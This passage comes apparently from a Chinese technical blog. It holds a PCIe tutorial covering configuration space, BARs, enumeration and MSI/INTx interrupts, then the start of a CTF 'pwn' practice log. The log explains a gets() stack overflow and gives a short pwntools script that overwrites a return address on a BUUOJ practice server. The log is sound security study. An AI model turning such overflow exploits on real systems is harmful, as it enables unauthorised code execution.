class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute01:~# lshw -businfo<br>Bus info          Device        Class          Description<br>==========================================================<br>                                system         CS5280H2 (0)<br>                                bus            CS5280H2<br>                                memory         64KiB BIOS<br>cpu@0                           processor      Hygon C86-3G 7380 32-core Processor<br>                                memory         768KiB L1 cache<br>                                memory         4MiB L2 cache<br>                                memory         64MiB L3 cache<br>cpu@1                           processor      Hygon C86-3G 7380 32-core Processor<br>                                memory         768KiB L1 cache<br>                                memory         4MiB L2 cache<br>                                memory         64MiB L3 cache<br>                                memory         128GiB System Memory<br>                                memory         [empty]<br>                                memory         32GiB DIMM DDR4 Synchronous Registered (Buffered) 3200 MHz (0.3 ns)<br>                                memory         [empty]<br>                                memory         [empty]<br>                                memory         [empty]<br>                                memory         32GiB DIMM DDR4 Synchronous Registered (Buffered) 3200 MHz (0.3 ns)<br></code></pre></td></tr></table></figure><p>PCI 设备是在内核启动初始化阶段进行枚举的，这个时候可能有的设备还没准备好，从而没被枚举到，这种情况下我们可以使用如下命令重新进行设备枚举：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /sys/bus/pci/rescan</span><br></code></pre></td></tr></table></figure><h2 id="设备编号">设备编号</h2><p>每个PCI 设备都有着三个编号：<strong>总线编号（Bus Number）、设备编号（Device Number）与功能编号（Function Number）</strong>，作为设备的唯一标识；在此之上还有 <strong>PCI 域</strong>的概念，一个 PCI 域上最多可以连接 256 根 PCI 总线</p><p>当我们使用 <code>lspci</code> 命令查看 PCI 设备信息时，在每个设备开头都可以看到形如 <code>xx:yy.z</code> 的十六进制编号，这个格式其实是 <code>总线编号:设备编号.功能编号</code>，当我们使用 <code>lspci -v </code>查看 PCI 设备信息时，在总线编号前面的 4 位数字便是 PCI 域的编号</p><h1 id="PCI设备配置空间">PCI设备配置空间</h1><p>PCIE配置空间‌是每个PCIe设备的一段独立空间，系统通过访问这段空间可以获取设备的信息并进行配置。配置空间的结构包括<strong>头标区</strong>和<strong>设备相关区</strong>，<strong>配置头长度为64字节，包含用于唯一识别设备的字段</strong>；剩余的字节则因设备而异，用于描述设备的特定功能‌。</p><p><strong>PCI设备配置空间为256字节，PCIE设备的配置空间为4K字节，两种设备配置头均为64字节</strong>，但由于PCIE设备的功能更强大，需要更多扩展空间来描述其特定功能‌，又为了兼容PCI，PCIE扩展了地址0x100~0xfff用于PCIE扩展配置空间。</p><p>在每次启动时，PCIe设备的配置空间地址一般有BOIS分配，分配完成后主设备系统启动后可扫描PCIe设备的配置空间，获取PCIe设备并完成PCIE相关配置。</p><p>PCI及PCIE配置空间分配如下图所示</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250710203458864.png" alt="image-20250710203458864"></p><h2 id="PCIE配置头">PCIE配置头</h2><p>PCIE 64字节的配置头分为两种，Type0和Type1，Type0用于描述PCIE Endpoint，Type1用于描述PCIE Bridge或者Switch。</p><p>Agent 类型配置空间又被称为 <code>Type 00h</code>，格式如下图所示：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250710202242452.png" alt="image-20250710202242452"></p><p>Bridge 类型配置空间被称为 <code>Type 01h</code>，与 Agent 类型配置空间大同小异：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250710204925936.png" alt="image-20250710204925936"></p><p>简单介绍几个比较重要的字段：</p><ul><li><p>设备标识相关：</p><ul><li><code>Vendor ID</code>：生产厂商的 ID，例如 Intel 设备通常为 <code>0x8086</code></li><li><code>Device ID</code>：具体设备的 ID，通常也是由厂家自行指定的</li><li><code>Class Code</code>：类代码，用于区分设备类型</li><li><code>Revision ID</code>：PCI 设备的版本号，可以看作 Device ID 的扩展</li></ul></li><li><p>设备状态相关：</p><ul><li><p><code>Status</code>：设备的状态字寄存器，各 bit 含义如下图所示：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250710205003820.png" alt="image-20250710205003820"></p></li><li><p><code>Command</code>：设备的状态字寄存器，各 bit 含义如下图所示：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250710205028241.png" alt="image-20250710205028241"></p></li></ul></li><li><p>设备配置相关：</p><ul><li><code>Base Address Registers</code>：决定了 PCI 设备空间映射到系统空间的具体位置，有两种映射方式：MMIO 与 PMIO，映射方式由最低位决定，不可更改</li><li><code>Interrupt Pin</code>：中断引脚，该寄存器表示设备所连接的引脚</li><li><code>Interrupt Line</code>：中断编号</li></ul></li></ul><p>前面我们讲到 lspci 命令，我们可以使用 <code>-s</code> 来通过指定查看的具体 PCI 设备，通过 <code>-m</code> 查看部分信息，通过 <code>-nn</code> 查看比较详细的信息:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute01:~# lspci -vv -s e2:00.1 -m<br>Device: e2:00.1<br>Class:  Encryption controller<br>Vendor: Chengdu Haiguang IC Design Co., Ltd.<br>Device: NTBCCP<br>SVendor:        Chengdu Haiguang IC Design Co., Ltd.<br>SDevice:        NTBCCP<br>NUMANode:       7<br></code></pre></td></tr></table></figure><p>我们还可以直接使用 <code>-x</code> 参数来查看 PCI 设备的配置空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute01:~# lspci -s e2:00.1 -x<br>e2:00.1 Encryption controller: Chengdu Haiguang IC Design Co., Ltd. NTBCCP<br>00: 94 1d 68 14 07 04 10 00 00 00 80 10 00 00 80 00<br>10: 00 00 00 00 00 00 00 00 00 00 c0 bc 00 00 00 00<br>20: 00 00 00 00 00 00 d0 bc 00 00 00 00 94 1d 68 14<br>30: 00 00 00 00 48 00 00 00 00 00 00 00 07 01 00 00<br></code></pre></td></tr></table></figure><p>在 Linux 当中我们也可以通过 procfs 或 sysfs 这样的文件系统来查看设备的相关配置信息，例如通过 <code>/proc/bus/pci/e2/00.1</code> 文件我们同样可以查看 PCI 设备的配置空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute01:~# cat /proc/bus/pci/e2/00.1 | xxd<br>00000000: 941d 6814 0704 1000 0000 8010 0000 8000  ..h.............<br>00000010: 0000 0000 0000 0000 0000 c0bc 0000 0000  ................<br>00000020: 0000 0000 0000 d0bc 0000 0000 941d 6814  ..............h.<br>00000030: 0000 0000 4800 0000 0000 0000 0701 0000  ....H...........<br>00000040: 0000 0000 0000 0000 0950 0800 941d 6814  .........P....h.<br>00000050: 0164 0300 0800 0000 0000 0000 0000 0000  .d..............<br>00000060: 0000 0000 10a0 0200 a18f 0000 1029 0900  .............)..<br>00000070: 030d 4000 4000 0311 0000 0000 0000 0000  ..@.@...........<br></code></pre></td></tr></table></figure><p>通过 <code>/sys/devices/pci0000:e2/0000:e2:00.1</code> 下的其他文件也可以访问该设备的一些其他资源信息（例如通过 <code>resource0</code> 可以直接访问 MMIO 空间，<code>resource1</code> 则为其 PMIO 空间）</p><h1 id="PCI-Base-Address-register">PCI Base Address register</h1><p>BAR（Base Address Register）空间是在PCIe设备中的。BAR是一组特殊的寄存器，用于定义设备的内存和I/O地址空间。这些地址是设备和主机系统通信的基础。</p><blockquote><p>为什么需要BAR？</p><p>设备内部使用 RAM 或者寄存器来实现的一些功能，有时需要让外部来访问，比如网卡的队列描述符，DMA 控制器等，需要让系统来探作和写入才能工作；或者 GPU 的显存 RAM 需要系统传输数据，然后 GPU 才能渲染和计算。</p><p>CPU和DMA控制器通过物理地址访问内存或设备，这些内部的 RAM 或者寄存器要被访问，就需要统一寻址，也就是统一映射到主机的物理地址空间，BAR的作用是将这些设备资源映射到主机共享的物理地址空间（如内存地址或I/O地址）。</p><p><strong>BAR 里面原本存在的值，告诉主机该设备需要多大的内存</strong>，后续CPU或DMA访问该地址时，PCIe总线会将其路由到对应设备。</p></blockquote><h2 id="BAR的类型">BAR的类型</h2><p>我们都知道与设备通信有两种方式：MMIO 与 Port IO，相应地 BAR 的格式也有如下两种：</p><ul><li><strong>Memory-Mapped I/O (MMIO) BAR：</strong> 这是最常见和推荐的类型。它请求将设备资源（寄存器、内存）映射到系统的物理<strong>内存地址空间</strong>。CPU 和 DMA 引擎使用普通的<code>mov</code>等内存访问指令来读写这些资源，就像访问普通内存一样（虽然实际访问的是设备）。MMIO BAR 还可以细分为：<ul><li><strong>32-bit BAR：</strong> 请求32位地址空间（最大4GB以下）。</li><li><strong>64-bit BAR：</strong> 请求64位地址空间（大于4GB）。一个64位 BAR 会占用<strong>两个</strong>连续的32位 BAR 位置（BAR[n] 存放低32位地址，BAR[n+1] 存放高32位地址）。</li><li><strong>Prefetchable vs. Non-Prefetchable：</strong> 指示该内存区域的内容是否可以被CPU预取或缓存（通常设备上的内存缓冲区是可预取的，寄存器是不可预取的）。</li></ul></li><li><strong>I/O Space BAR：</strong> 请求将设备资源（通常是寄存器）映射到系统的<strong>I/O地址空间</strong>（x86架构特有的、较小的独立地址空间）。CPU 需要使用专门的 <code>in</code> 和 <code>out</code> 指令来访问这些资源。现代设备和操作系统<strong>强烈倾向于使用 MMIO</strong>，I/O BAR 已很少见。</li></ul><h2 id="BAR的初始化">BAR的初始化</h2><p>通过 BAR 进行资源分配的具体过程如下：</p><ul><li><p>BAR中低位会在PCI复位时，<strong>通过将低位的 bit 设置为 read only 的 0 来标识最小地址空间大小</strong>，低位也就不可写入并且为0了。</p></li><li><p>Host 软件 (BIOS 或者操作系统) 读取设备的 BAR 个数和大小。Host 通过向BAR 写全 1，然后读取返回值。设备硬件会返回一个掩码，其中低位连续的<code>0</code>表示所需空间的大小（如返回<code>0xFFFF0000</code>表示需要64KB空间）。如果返回 0, 说明没有实现 BAR。</p></li><li><p>系统根据探测结果，在物理地址空间中找到一个未使用的、对齐的地址范围（例如<code>0x50000000</code>），将其写入BAR。此地址成为设备资源的“入口”。配置完成后，设备内部的寄存器或缓冲区（如<code>0x00</code>~<code>0xFF</code>）会被映射到主机物理地址的连续范围。</p></li></ul><h2 id="处理器域与-PCI-域间访问">处理器域与 PCI 域间访问</h2><p>需要注意的一点是，<strong>处理器使用存储器域的地址，而 BAR 寄存器存放 PCI 总线域的地址</strong>，因此处理器不能直接通过 <code>BAR + offset</code> 的方式访问 PCI 设备的 BAR 空间，而应当要<strong>将 PCI 总线域的地址转换为存储器域的地址</strong></p><p>由此，PCI BAR 中地址在存储器域中皆有着相应的映像，当处理器访问 PCI 设备的地址空间时，首先访问该设备在存储器域中的地址空间，之后通过 HOST 主桥将存储器域上地址空间转换为 PCI 总线域的地址空间，最后通过 PCI 总线将数据发送到指定的设备中</p><p>反之亦然，当 PCI 设备需要访问存储器域的地址空间时（DMA 操作），首先需要访问该存储器地址空间所对应的 PCI 总线空间，之后通过 HOST 主桥将其转换为存储器地址空间，再由 DDR 控制器完成对存储器的读写</p><blockquote><p>例如：</p><p>CPU或DMA控制器发出PCI设备的物理地址（如<code>0x50000008</code>，地址<code>0x50000000</code>+偏移<code>0x08</code>）,HOST 主桥会将其转换为 PCI 总线域地址（如 <code>0xE000_0008</code>），再通过 PCI 总线发送给设备。同样，当设备执行 DMA 写入内存时，它使用 PCI 总线域地址（如 <code>0xE000_0000</code>），HOST 主桥会将其转换为存储器域地址（如 <code>0x5000_0000</code>），最终由内存控制器完成写入。</p></blockquote><p>如前面描述，PCIE配置空间中不同type下的BAR配置空间不同，Type0有6个可配置BAR空间，Type1有2个可配置BAR空间。</p><h1 id="PCI-设备内存-端口空间与访问方式">PCI 设备内存 &amp; 端口空间与访问方式</h1><p>前面我们讲了 PCI 设备与特性和配置相关的配置空间，现在我们来看与 PCI 设备与实际操作相关的内存映射空间与端口映射空间。</p><p>所有 IO 设备的内存与端口空间需要被映射到对应的地址空间/端口空间中才能访问，这需要占用部分的内存地址空间与端口地址空间，上一章已经提到过两种映射外设资源的方式<strong>MMIO</strong>和<strong>PMIO</strong>。</p><p>完成映射之后通过相应的内存/端口访问到的便是 PCI 设备的内存/端口地址空间。</p><p>通过 procfs 的 <code>/proc/iomem</code> 我们可以查看物理地址空间的情况，其中我们便能看到各种设备所占用的地址空间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute01:~# cat /proc/iomem<br>00000000-00000fff : Reserved<br>00001000-000977ff : System RAM<br>00097800-0009ffff : Reserved<br>000a0000-000bffff : PCI Bus 0000:00<br>000c0000-000dffff : PCI Bus 0000:00<br>000e0000-000fffff : Reserved<br>  000f0000-000fffff : System ROM<br>00100000-7a3dffff : System RAM<br>7a3e0000-7a6bdfff : Reserved<br>7a6be000-7a7bdfff : ACPI Non-volatile Storage<br>7a7be000-7a7fdfff : ACPI Tables<br>7a7fe000-7bffdfff : System RAM<br>7bffe000-7fffffff : Reserved<br>bcc00000-bf1fffff : PCI Bus 0000:e0<br>  bcc00000-bcdfffff : PCI Bus 0000:e2<br>    bcc00000-bccfffff : 0000:e2:00.1<br>    bcd00000-bcd01fff : 0000:e2:00.1<br></code></pre></td></tr></table></figure><p>通过 procfs 的 <code>/proc/ioports</code> 我们可以查看 IO 端口情况，其中便包括各种设备对应的 PMIO 端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute01:~# cat /proc/ioports<br>0000-02f7 : PCI Bus 0000:00<br>  0000-001f : dma1<br>  0020-0021 : pic1<br>  0040-0043 : timer0<br>  0050-0053 : timer1<br>  0060-0060 : keyboard<br>  0061-0061 : PNP0800:00<br>  0064-0064 : keyboard<br>  0070-0071 : rtc0<br>  0080-008f : dma page reg<br>  00a0-00a1 : pic2<br>  00c0-00df : dma2<br>  00f0-00ff : fpu<br>0300-03af : PCI Bus 0000:00<br>03b0-03df : PCI Bus 0000:00<br>  03c0-03df : vesafb<br>03f8-03ff : serial<br>0400-0cf7 : PCI Bus 0000:00<br>  040b-040b : pnp 00:02<br>  04d0-04d1 : pnp 00:02<br>  04d6-04d6 : pnp 00:02<br>  0800-089f : pnp 00:02<br>    0800-0803 : ACPI PM1a_EVT_BLK<br>    0804-0805 : ACPI PM1a_CNT_BLK<br>    0808-080b : ACPI PM_TMR<br>    0820-0827 : ACPI GPE0_BLK<br>  0900-090f : pnp 00:02<br>  0910-091f : pnp 00:02<br>  0b00-0b0f : pnp 00:02<br>    0b00-0b08 : piix4_smbus<br></code></pre></td></tr></table></figure><h1 id="总结PCIE设备识别流程">总结PCIE设备识别流程</h1><h2 id="第一阶段：PCIe-设备接入与总线发现">第一阶段：PCIe 设备接入与总线发现</h2><p>当一块 PCIe 设备被插入主板时：</p><ol><li>PCIe Root Complex（RC）通过 LTSSM（Link Training and Status State Machine）与设备端口建立物理链路；</li><li>设备进入 L0 状态，表示链路准备就绪；</li><li>这时设备尚未有地址，也不在主机内存映射范围内，仅在 RC 侧可探测；</li></ol><p>这一步 <strong>是自动发生的</strong>，不依赖 CPU 或操作系统参与，完全是硬件层完成的。</p><blockquote><p>RC 通常是主板芯片组的一部分（比如 Intel 的 PCH），或者直接集成在 CPU 里，它暴露出多个 <strong>PCIe Root Port</strong>，每个 Root Port 可以连接一个 PCIe 设备或 switch。负责<strong>设备枚举、地址分配、配置、事务处理</strong>。是连接 CPU/内存子系统与 PCIe 设备的&quot;网关&quot;。</p></blockquote><blockquote><p>当你插上一个 PCIe 设备后，<strong>主机与设备之间的物理链路还未建立</strong>，它们之间要经过一系列握手、训练、信号同步过程才能通信。这个过程就是由 <strong>LTSSM</strong> 控制的，类似于网络连接建立中的“三次握手”。LTSSM还可以实时维持信号完整性并在纳秒级内恢复链路错误。</p></blockquote><h2 id="第二阶段：通过枚举发现设备">第二阶段：通过枚举发现设备</h2><p>主机并不知道PCIe设备具体在哪，但是主机可以构造配置一个一个的去探测，从<strong>总线0、设备0、功能0（BDF 0:0.0）</strong> 开始，向每个可能的BDF（Bus/Device/Function）发送配置读请求。如果没有设备则读请求超时，如果都会有效的Vendor ID 和 Device ID，主机就知道这里有一个真实的设备或Bridge存在。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">TLP: CFG Read Type 0 → BDF = 00:00.0, Offset = 0x00 (Vendor ID)<br></code></pre></td></tr></table></figure><blockquote><p>疑惑：主机不知道PCIe的地址其实就无法访问PCIe设备，为什么还能通过BDF枚举来访问到设备？</p><p>这里其实是CPU向<code>CONFIG_ADDRESS</code>写入一个格式化的值（包含B, D, F, Register Number）后，再对<code>CONFIG_DATA</code>执行I/O读/写操作时，RC硬件会<strong>自动</strong>将这个操作转换成一个 <strong>配置事务TLP (Configuration Read/Write TLP)</strong>，而RC能通过PCIe总线发送TLP，从而能找到设备。</p></blockquote><h2 id="第三阶段：资源分配">第三阶段：资源分配</h2><p>枚举到设备后，RC 读取其配置空间中的 BAR 寄存器（位于 offset 0x10 开始），主机会尝试向该 BAR 写入全 1（0xFFFFFFFF），设备按协议屏蔽掉其低位（如低 4 位），返回其所需地址大小掩码，主机用该返回值计算出所需资源大小。</p><p>主机为此设备 <strong>分配未被占用的内存空间</strong>，并维护一个全局的 <strong>地址空间映射表</strong>。随后主机将分配好的地址重新写入 BAR，告诉设备：“你应该监听这个物理地址范围的访问。”</p><p>主机为设备分配中断，主机通过设备的MSI/MSI-X Capability结构，分配一个或多个<strong>中断向量号</strong>（代表特定的中断处理程序）。主机将<strong>目标地址</strong>（通常是中断控制器特定的地址）和<strong>数据值</strong>（包含向量号等信息）写入设备的MSI/MSI-X配置寄存器。</p><p><strong>当设备需要中断时，它不再拉信号线，而是向配置好的目标地址写入配置好的数据值（发起一个Memory Write TLP）。</strong> 中断控制器捕获这个写操作，根据数据值识别出中断向量，从而触发CPU执行相应的中断服务程序。这种方式相当于直接写内存的方式来触发中断，消除了中断线共享冲突的问题。</p><h2 id="第四阶段：设备初始化与驱动加载">第四阶段：设备初始化与驱动加载</h2><p>主机（OS）根据设备的 <strong>Vendor ID, Device ID, Class Code, Subsystem Vendor/Device ID</strong> 等信息，在驱动数据库中查找匹配的设备驱动程序。</p><p>找到匹配驱动后，OS加载该驱动模块。驱动读取设备的配置空间，获取到主机分配好的<strong>BAR基地址</strong>。驱动使用这些基地址，通过<strong>Memory Mapped I/O (MMIO)</strong>（访问内存BAR）或 <strong>Port I/O (PIO)</strong>（访问IO BAR，较少用）的方式，访问设备的寄存器，进行进一步的初始化、重置、参数配置等。</p><h2 id="第五阶段：正常通信">第五阶段：正常通信</h2><p>主机CPU/其他设备可以通过 <strong>Memory Write TLP</strong> 向设备的内存映射寄存器（由BAR定义）写入控制命令或数据，通过 <strong>Memory Read TLP</strong> 读取设备的内存映射寄存器或数据缓冲区。</p><p>设备可以通过 <strong>Memory Write TLP</strong> 向主机内存写入数据（例如，网卡收到数据包DMA到内存，显卡完成渲染帧DMA到帧缓冲区），通过 <strong>Memory Read TLP</strong> 读取主机内存。</p><h1 id="主机上电启动简易流程">主机上电启动简易流程</h1><h2 id="x86">x86</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`上电` → `CPU启动（固化BootROM）` → `BIOS/UEFI` → `Bootloader（如GRUB）` → `OS Kernel` → `Init`<br></code></pre></td></tr></table></figure><h1 id="SoC（ARM等）">SoC（ARM等）</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`上电` → `BootROM` → `BL1/BL2`（Bootloader 分级）→ `UEFI / TrustZone` → `OS Kernel`<br></code></pre></td></tr></table></figure><h1 id="PCI中断机制🕊️">PCI中断机制🕊️</h1><p>PCI 设备有两种打中断的方法：传统的 INTx 中断与 MSI 中断，出于兼容的需要 PCIe 完全继承了这个特性</p><h2 id="INTx中断">INTx中断</h2><p>INTx 类型的中断即传统的<strong>通过中断引脚来产生的中断</strong>，PCI 总线使用 <code>INTA#</code> 、<code>INTB#</code> 、<code>INTC#</code> 、<code>INTD#</code> 信号（低电平有效）向处理器发出中断请求，不过多数设备仅使用 <code>INTA#</code> 信号</p><p>下图为一个产生 <code>INTA#</code> 中断信号的流程：</p><ul><li>设备向南桥上的中断控制器打一个 <code>INTA#</code> ，中断控制器转为 <code>INTR</code> 信号后通过 APIC bus 打向处理器</li><li>接受中断信号的处理器（未设置则默认都打到 CPU0）通过中断向量表执行对应的处理程序</li></ul><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250729151921563.png" alt="image-20250729151921563"></p><p>在 PCI 总线中，设备的 <code>INTx 引脚</code>最终要连接到中断控制器的 <code>IRQ 引脚</code> ，下图是一个三 PCI 插槽与中断控制器引脚进行连接的例子：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250729152233839.png" alt="image-20250729152233839"></p><p>还记得我们前文所讲的 PCI 配置空间中的 <code>Interrupt Pin</code> 与 <code>Interrupt Line</code> 域吗？现在我们可以进一步明确其具体用途了：</p><ul><li><code>Interrupt Pin</code>：记录设备应该使用哪一个 INTx 中断信号</li><li><code>Interrupt Line</code>：记录设备连接的引脚</li></ul><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250729152254895.png" alt="image-20250729152254895"></p><h2 id="MSI-MSI-X-中断">MSI/MSI-X 中断</h2><p><strong>Message Signaled Interrupt</strong> 是一种更为现代化与普遍的 PCI 中断机制，<strong>MSI-eXtend</strong> 则为其升级版，该机制的引入是为了消除 INTx 的边带信号，目前绝大多数 PCIe 设备已不再使用传统的 INTx 中断，而是使用 MSI/MSI-X 提交中断请求</p><p>在 PCIe 设备中有着两个 Capability 结构，分别对应 MSI 与 MSI-X，通常一个 PCIe 设备仅会包含其中一个。对于 MSI 而言其 Capability ID 为 5，一共有四种结构，分别对应 32 位与 64 位的 Message 结构，以及对应的带上中断 Masking 的结构</p><p>MSI/MSI-X 本质上是通过<strong>向特定的内存区域进行写入</strong>来达到中断触发的效果，当 PCI 设备提交请求时，其向 <code>MSI/MSI-x Capability</code> 结构中的 <code>Message Address</code> 地址（PCI总线域）写入 <code>Message Data</code> 数据，从而产生一个存储器写 TLP，由此向处理器提交存储器写请求</p><p>MSI 仅支持 32 个连续的中断向量，而 MSI-X 支持 2048 个非连续的中断向量，但 MSI-X 的中断向量信息并不像 MSI 那样直接存放在配置空间，而是存放在 MMIO 空间中，通过BIR（Base address Indicator Register）与 BAR 来确定其在 MMIO 中的具体位置</p><p>其结构如下图所示：</p><h1 id="PCIE协议的分层结构​​">PCIE协议的分层结构​​</h1><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250710201210154.png" alt="image-20250710201210154"></p><p>PCIe 设备内部层次包括：</p><ul><li><strong>设备核心层以及它与事务层的接口</strong>。设备核心层实现设备的主要功能。如果设备是一个端点，那么它最多可以包含 8 个功能（function），每个功能实现自己的配置空间。如果设备是一个交换机，那么它的核心由数据包路由逻辑和为了实现路由的内部总线构成。如果设备是一个 RC，那么其核心会实现一个虚拟的 PCI 总线 0，在这个虚拟的 PCI 总线 0中存在着所有的芯片组嵌入式端点以及虚拟桥。</li><li><strong>事务层</strong>。事务层负责在发送端产生 TLP（Transaction Layer Packet，事务层包），在接收端对 TLP 进行译码，用户对数据进行组帧和解析是在本层进行。这一层也负责 QoS（Quality of Service，服务质量）、流量控制以及事务排序。</li><li><strong>数据链路层</strong>。数据链路层负责在发送端产生 DLLP（Data Link Layer Packet，数据链路层包），在接收端对 DLLP 进行译码。这一层也负责链路错误检测以及修正，这个数据链路层功能被称为 Ack/Nak 协议。这两个数据链路层功能会在本书的第三部分进行讲解。</li><li><strong>物理层</strong>。物理层负责在发送端产生字符序列包，在接收端对字符序列包进行译码。这一层将处理上述三种类型的包（TLP、DLLP、字符序列包）在物理链路上的发送与接收。数据包在发送端要经过字节条带化逻辑、扰码器、8b/10b 编码器（对于 Gen1/Gen2）或是 128b/130b 编码器（对于 Gen3）以及数据包并串转换模块的处理。最终数据包以训练后的链路速率在所有通道上按照时钟以差分形式输出。在物理层的接收端，数据包处理包括串行地接收差分形式的比特信号，将其转换为数字信号形式，然后将输入比特流做串并转换。这个操作基于来源于 CDR（Clock and Data Recovery，时钟数据恢复）电路所提供的恢复时钟。接收下来的数据包要经过弹性缓存、8b/10b 解码器（对于 Gen1/Gen2）或者 128b/130b 解码器（对于 Gen3）、解扰器以及字节交换恢复逻辑。最终，物理层的 LTSSM（Link Training and Status State Machine，链路训练状态机）负责进行链路初始化以及训练。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>PCIe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn做题记录</title>
    <link href="/2025/05/14/pwn%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/05/14/pwn%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="00-开始之前">00 开始之前</h1><p>因为研究生做的方向和内核相关，感觉pwn里面很多技巧都是运用内核的漏洞的，所以学习一下pwn并做一下记录。另一个主要原因就是觉得pwn真的非常实用<s>非常帅</s></p><h1 id="01-ciscn-2019-n-1">01 ciscn_2019_n_1</h1><p>这道题目是一道简单的栈溢出题目，先查看一下保护措施，发现开启栈不可执行保护。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514144722687.png" alt="image-20250514144722687"></p><p>接下来到ida查看一下函数主体部分，发现函数逻辑很简单，并且存在gets函数，是个明显的栈溢出漏洞。其中<code>v1</code> 是 <code>char[44]</code> 的缓冲区，但 <code>gets()</code> 可输入无限长度数据，导致栈溢出。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514144912449.png" alt="image-20250514144912449"></p><p>虽然开启了栈不可执行保护，但是函数中本身存在<code>cat /flag</code>逻辑，无需在栈中执行程序，因此这里可以选择覆盖v2的值，也可以选择直接跳转到system函数执行。</p><p>这里笔者选择直接跳转执行system函数查看代码堆栈内容，可以看到堆栈中ret距离v1有0x30+8个字节，因此直接填充0x38个字符即可。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514145746072.png" alt="image-20250514145746072"></p><p>接下来构造POC，其中system的地址查看后为0x4006BE。POC如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25764</span>)<br><br>p1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x4006BE</span>)<br><br>r.sendline(p1)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="02-ret2shellcode">02 ret2shellcode</h1><p>先看一下程序基本信息，发现基本上没有开启什么保护措施，并且RWX段还表示程序中存在可读、可写、可执行的代码段。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250515130444924.png" alt="image-20250515130444924"></p><p>接下来看一下函数主体，gets危险函数，存在栈溢出。但是发现不存在system函数，那就不能直接使用现有函数，考虑我们自己写入shellcode或者是通过ROP来执行shellcode。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250515130530096.png" alt="image-20250515130530096"></p><p>这道题已经提示的很明显了，并且RWX还含有可读写执行的段，那大概率是我们自己写入shellcode。不过这里还是查看一下。在gdb中使用vmmap查看段的权限。</p><p><img 